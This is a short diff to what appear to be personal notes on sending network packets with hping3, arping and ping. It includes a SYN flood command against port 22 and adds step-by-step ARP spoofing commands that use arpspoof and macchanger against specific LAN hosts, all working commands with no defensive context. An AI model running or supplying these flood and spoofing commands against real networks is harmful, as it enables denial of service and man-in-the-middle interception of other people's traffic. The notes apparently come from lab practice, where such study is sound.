@@ -2,3 +2,10 @@ to send tcp packets: sudo hping3 -S --flood -p 22 192.168.x.x
 to send udp packets: sudo hping3 --udp -p 12345 -c 1 192.168.x.x
 to send arp packets: sudo arping 192.168.x.x, make sure to do sudo ip link set wlan0 promisc on
 to send icmp packets: ping 192.168.x.x
+
+to create arp spoof attack:
+  1) terminal 1: sudo arpspoof -i enp0s3 -t 192.168.1.8 192.168.1.1
+  2) terminal 2:
+      (i) sudo macchanger -r enp0s3
+      (ii) sudo arpspoof -i enp0s3 -t 192.168.1.8 192.168.1.1
+  3) terminal 3: sudo arpspoof -i enp0s3 -t 192.168.1.1 192.168.1.8
